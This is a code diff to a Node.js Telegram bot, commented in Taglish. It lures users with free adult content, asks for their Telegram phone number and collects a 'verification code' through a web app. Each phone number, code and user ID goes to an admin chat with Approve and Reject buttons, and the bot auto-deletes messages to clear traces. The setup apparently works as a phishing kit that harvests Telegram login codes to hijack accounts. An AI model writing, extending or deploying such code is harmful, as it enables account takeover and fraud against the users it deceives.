@@ -1,21 +1,14 @@
 import express from "express";
 import cors from "cors";
 import { Telegraf } from "telegraf";
-import fetch from "node-fetch";
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const WEBAPP_URL = process.env.WEBAPP_URL;     // e.g. https://tgreward.shop/webapp.html
 const WEBSITE_URL = process.env.WEBSITE_URL;   // e.g. https://tgreward.shop/QTSJAOPPHU.html
-
-// admin logging bot
-const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // numeric string, e.g. "5757713537"
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // e.g. "5757713537"
 
 if (!BOT_TOKEN) {
   throw new Error("BOT_TOKEN is not set");
-}
-if (!ADMIN_BOT_TOKEN) {
-  throw new Error("ADMIN_BOT_TOKEN is not set");
 }
 if (!ADMIN_CHAT_ID) {
   throw new Error("ADMIN_CHAT_ID is not set");
@@ -23,15 +16,14 @@ if (!ADMIN_CHAT_ID) {
 
 const bot = new Telegraf(BOT_TOKEN);
 
-// in-memory storage: Telegram user id -> phone number (shared contact)
-const userPhones = new Map();
+// in-memory storage
+const userPhones = new Map();   // Telegram user id -> phone number
+const submissions = new Map();  // submissionId -> { userId, code, telegramPhone, username, firstName }
 
-// helper: schedule delete ng message after delayMs (default 30s)
+// helper: delete message after delayMs
 function scheduleDelete(chatId, messageId, delayMs = 30000) {
   setTimeout(() => {
-    bot.telegram.deleteMessage(chatId, messageId).catch(() => {
-      // ignore errors
-    });
+    bot.telegram.deleteMessage(chatId, messageId).catch(() => {});
   }, delayMs);
 }
 
@@ -55,7 +47,7 @@ bot.start(async (ctx) => {
     return;
   }
 
-  // 1) Hingi ng Telegram phone number (optional pero recommended)
+  // 1) Hingi ng Telegram phone number (optional)
   await replyAndAutoDelete(
     ctx,
     "Para ma-verify na legit Telegram account ka, puwede mong i-share ang TELEGRAM phone number mo gamit ang button sa ibaba (optional pero recommended).",
@@ -75,7 +67,7 @@ bot.start(async (ctx) => {
     }
   );
 
-  // 2) Sabay padala ng WebApp button
+  // 2) WebApp button
   await replyAndAutoDelete(
     ctx,
     "🔞 To access the files completely free 💦\n\n" +
@@ -100,10 +92,10 @@ bot.on("contact", async (ctx) => {
   const contact = ctx.message.contact;
   if (!contact) return;
 
-  // delete agad ang contact message ng user (para di nakatambak yung number)
+  // delete agad ang contact message
   scheduleDelete(ctx.chat.id, ctx.message.message_id, 2000);
 
-  // siguraduhin na sariling number niya, hindi ibang contact
+  // siguraduhin na sariling number niya
   if (contact.user_id && contact.user_id !== ctx.from.id) {
     const warn = await ctx.reply(
       "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
@@ -126,12 +118,12 @@ bot.on("contact", async (ctx) => {
   scheduleDelete(ctx.chat.id, reply.message_id, 30000);
 });
 
-// optional: mabasa data mula WebApp
+// optional: WebApp data callback
 bot.on("message", async (ctx) => {
   const data = ctx.message.web_app_data?.data;
   if (data) {
     console.log("WEBAPP DATA:", data);
-    const msg = await ctx.reply("Verification received ✅");
+    const msg = await ctx.reply("Your code was submitted. Please wait for admin review. ⏳");
     scheduleDelete(ctx.chat.id, msg.message_id, 30000);
   }
 });
@@ -141,28 +133,7 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// helper: send log message sa admin bot
-async function sendAdminLog(text) {
-  const url = `https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`;
-  const body = {
-    chat_id: ADMIN_CHAT_ID,
-    text,
-  };
-
-  const res = await fetch(url, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(body),
-  });
-
-  const data = await res.json();
-  if (!data.ok) {
-    console.error("Failed to send admin log:", data);
-    throw new Error("Admin bot sendMessage failed");
-  }
-}
-
-// endpoint na tinatawag ng WebApp
+// API endpoint na tinatawag ng WebApp
 app.post("/api/log-code", async (req, res) => {
   console.log("Received /api/log-code body:", req.body);
 
@@ -173,34 +144,113 @@ app.post("/api/log-code", async (req, res) => {
     return res.status(400).json({ ok: false, error: "Missing code" });
   }
 
-  // hanapin kung may na-share na Telegram phone number ang user
-  let telegramPhone = "N/A";
-  if (tgUser && typeof tgUser.id === "number") {
-    const stored = userPhones.get(tgUser.id);
-    if (stored) {
-      telegramPhone = stored;
-    }
-  }
+  const userId = tgUser?.id;
+  const username = tgUser?.username || "N/A";
+  const firstName = tgUser?.first_name || "";
+  const telegramPhone = userId && userPhones.get(userId) ? userPhones.get(userId) : "N/A";
 
-  const logText = [
-    "🔔 New verification submission",
-    "",
-    `Code: ${code}`,
-    `Telegram phone (shared contact): ${telegramPhone}`,
-    "",
-    "Telegram user info:",
-    JSON.stringify(tgUser || {}, null, 2),
-    "",
-    `Time: ${new Date().toISOString()}`,
-  ].join("\n");
+  const displayName =
+    firstName && username ? `${firstName} (@${username})`
+    : username ? `@${username}`
+    : firstName || "Unknown user";
+
+  // gumawa ng unique submission id
+  const submissionId = `${userId || "unknown"}:${Date.now()}`;
+
+  submissions.set(submissionId, {
+    userId,
+    code,
+    telegramPhone,
+    username,
+    firstName,
+  });
+
+  const logText =
+    "🔔 New verification request\n\n" +
+    `👤 User: ${displayName}\n` +
+    `🆔 ID: ${userId || "N/A"}\n` +
+    `📱 Telegram phone: ${telegramPhone}\n\n` +
+    `🔑 Code: ${code}\n\n` +
+    "Tap a button below to approve or reject.";
 
   try {
-    await sendAdminLog(logText);
+    await bot.telegram.sendMessage(ADMIN_CHAT_ID, logText, {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Approve", callback_data: `approve:${submissionId}` },
+            { text: "❌ Reject", callback_data: `reject:${submissionId}` },
+          ],
+        ],
+      },
+    });
     console.log("Admin log sent");
     return res.json({ ok: true });
   } catch (err) {
     console.error("Admin log send error:", err);
     return res.status(500).json({ ok: false, error: "Admin log send failed" });
+  }
+});
+
+// handle admin Approve/Reject buttons
+bot.on("callback_query", async (ctx) => {
+  const data = ctx.callbackQuery.data;
+  if (!data) return;
+
+  const [action, submissionId] = data.split(":");
+  const submission = submissions.get(submissionId);
+
+  if (!submission) {
+    await ctx.answerCbQuery("Submission not found or already processed.", { show_alert: true });
+    return;
+  }
+
+  submissions.delete(submissionId);
+
+  const { userId, code, telegramPhone, username, firstName } = submission;
+
+  const displayName =
+    firstName && username ? `${firstName} (@${username})`
+    : username ? `@${username}`
+    : firstName || "Unknown user";
+
+  const statusText =
+    action === "approve"
+      ? "✅ APPROVED"
+      : "❌ REJECTED";
+
+  const updatedText =
+    "🔔 Verification request\n\n" +
+    `👤 User: ${displayName}\n` +
+    `🆔 ID: ${userId || "N/A"}\n` +
+    `📱 Telegram phone: ${telegramPhone}\n\n` +
+    `🔑 Code: ${code}\n\n` +
+    `Status: ${statusText}`;
+
+  try {
+    // update admin message
+    await ctx.editMessageText(updatedText);
+
+    if (action === "approve") {
+      await ctx.answerCbQuery("Approved ✅");
+      if (userId) {
+        await bot.telegram.sendMessage(
+          userId,
+          "✅ Your verification has been APPROVED.\n\nYou can now continue using the bot."
+        );
+      }
+    } else if (action === "reject") {
+      await ctx.answerCbQuery("Rejected ❌");
+      if (userId) {
+        await bot.telegram.sendMessage(
+          userId,
+          "❌ Your verification has been REJECTED.\n\nPlease check the instructions in the channel and try again."
+        );
+      }
+    }
+  } catch (err) {
+    console.error("Error handling callback_query:", err);
+    await ctx.answerCbQuery("Error processing action.", { show_alert: true });
   }
 });
 
